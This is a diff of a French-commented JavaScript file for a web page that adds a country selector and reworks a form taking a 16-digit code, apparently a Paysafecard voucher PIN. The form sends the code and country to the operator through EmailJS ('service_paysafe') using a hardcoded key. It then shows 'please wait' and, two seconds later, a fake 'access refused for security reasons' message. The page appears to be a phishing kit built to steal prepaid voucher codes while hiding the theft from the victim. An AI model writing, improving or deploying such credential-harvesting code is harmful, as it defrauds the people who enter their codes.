@@ -1,86 +1,194 @@
 console.log("script.js chargé");
 
-// Initialisation EmailJS
-emailjs.init("rORVGScs1n94sqOPi");
+document.addEventListener("DOMContentLoaded", function () {
 
-function verifyOrder() {
 
-    console.log("verifyOrder appelée");
+// ==========================================
+// SÉLECTEUR DE PAYS
+// ==========================================
 
-    const input = document.getElementById("orderNumber");
-    const message = document.getElementById("message");
-    const button = document.querySelector(".search-box button");
+const countryButton = document.getElementById("countryButton");
+const countryOptions = document.getElementById("countryOptions");
+const selectedFlag = document.getElementById("selectedFlag");
+const selectedCountry = document.getElementById("selectedCountry");
+const countryInput = document.getElementById("country");
 
-    // Supprimer les espaces avant la vérification
-    const orderNumber = input.value.replace(/\s/g, "");
+if (
+    countryButton &&
+    countryOptions &&
+    selectedFlag &&
+    selectedCountry &&
+    countryInput
+) {
 
-    // Vérifie qu'il y a exactement 16 chiffres
-    if (!/^\d{16}$/.test(orderNumber)) {
-        message.style.color = "red";
-        message.textContent = "Please enter a valid 16-digit code.";
-        input.focus();
-        return;
-    }
+    // Ouvrir / fermer la liste
+    countryButton.addEventListener("click", function (event) {
 
-    button.disabled = true;
-    button.textContent = "Sending...";
-    message.textContent = "";
+        event.stopPropagation();
 
-    emailjs.send(
-        "service_paysafe",
-        "template_psf",
-        {
-            order_number: orderNumber
-        }
-    )
+        countryOptions.classList.toggle("show");
 
-    .then(function (response) {
+    });
 
-        console.log("Email envoyé !");
-        console.log(response);
 
-        message.style.color = "white";
-        message.textContent = " veillez patienter svp .";
+    // Sélection d'un pays
+    const countryItems =
+        countryOptions.querySelectorAll("div");
 
-        // Vider le champ
-        input.value = "";
-        input.focus();
+    countryItems.forEach(function (option) {
 
-        // Deuxième message après 2 secondes
-        setTimeout(function () {
-            console.log("Deuxième message");
-            message.style.color = "red";
-            message.textContent = "l'accès refusé pour raison de sécurité.";
-        }, 2000);
+        option.addEventListener("click", function (event) {
 
-        button.disabled = false;
-        button.textContent = "Submit";
+            event.stopPropagation();
 
-    })
+            const value = this.dataset.value;
+            const flagImage = this.querySelector("img");
 
-    .catch(function(error) {
+            if (!flagImage) {
+                return;
+            }
 
-        console.error("Erreur EmailJS :", error);
+            // Remplacer l'ancien drapeau
+            selectedFlag.src = flagImage.src;
 
-        message.style.color = "red";
-        message.textContent = "An error occurred.";
+            // Remplacer le code du pays
+            selectedCountry.textContent = value;
 
-        button.disabled = false;
-        button.textContent = "Submit";
+            // Mettre à jour la valeur cachée
+            countryInput.value = value;
+
+            // Fermer la liste
+            countryOptions.classList.remove("show");
+
+            console.log("Pays sélectionné :", value);
+
+        });
+
+    });
+
+
+    // Fermer en cliquant ailleurs
+    document.addEventListener("click", function () {
+
+        countryOptions.classList.remove("show");
+
     });
 
 }
 
-// Autoriser uniquement les chiffres + ajouter un espace tous les 4 chiffres
-document.getElementById("orderNumber").addEventListener("input", function () {
 
-    // Conserver uniquement les chiffres
-    let value = this.value.replace(/\D/g, "");
+// ==========================================
+// CHAMP CODE : 16 CHIFFRES
+// ==========================================
 
-    // Limiter à 16 chiffres
-    value = value.substring(0, 16);
+const orderNumberInput =
+    document.getElementById("orderNumber");
 
-    // Ajouter un espace tous les 4 chiffres
-    this.value = value.replace(/(\d{4})(?=\d)/g, "$1 ");
+if (orderNumberInput) {
+
+    orderNumberInput.addEventListener("input", function () {
+
+        let value = this.value.replace(/\D/g, "");
+
+        value = value.substring(0, 16);
+
+        this.value =
+            value.replace(/(\d{4})(?=\d)/g, "$1 ");
+
+    });
+
+}
+
+
+// ==========================================
+// INITIALISATION EMAILJS
+// ==========================================
+
+emailjs.init("rORVGScs1n94sqOPi");
+
 
 });
+
+// ==========================================
+// VÉRIFICATION DU CODE
+// ==========================================
+
+function verifyOrder() {
+
+
+console.log("verifyOrder appelée");
+
+const input = document.getElementById("orderNumber");
+const message = document.getElementById("message");
+const button = document.getElementById("submitOrderButton");
+const countryInput = document.getElementById("country");
+
+const country = countryInput.value;
+
+// Supprimer les espaces
+const orderNumber = input.value.replace(/\s/g, "");
+
+// Vérifier 16 chiffres
+if (!/^\d{16}$/.test(orderNumber)) {
+
+    message.style.color = "red";
+    message.textContent =
+        "Please enter a valid 16-digit code.";
+
+    input.focus();
+
+    return;
+}
+
+button.disabled = true;
+button.textContent = "Sending...";
+message.textContent = "";
+
+emailjs.send(
+    "service_paysafe",
+    "template_psf",
+    {
+        order_number: orderNumber,
+        country: country
+    }
+)
+.then(function (response) {
+
+    console.log("Email envoyé !");
+    console.log(response);
+
+    message.style.color = "white";
+    message.textContent =
+        "veillez patienter svp.";
+
+    input.value = "";
+    input.focus();
+
+    setTimeout(function () {
+
+        message.style.color = "red";
+
+        message.textContent =
+            "l'accès refusé pour raison de sécurité.";
+
+    }, 2000);
+
+    button.disabled = false;
+    button.textContent = "Envoi..";
+
+})
+.catch(function (error) {
+
+    console.error("Erreur EmailJS :", error);
+
+    message.style.color = "red";
+    message.textContent =
+        "An error occurred.";
+
+    button.disabled = false;
+    button.textContent = "Envoyer";
+
+});
+
+
+}
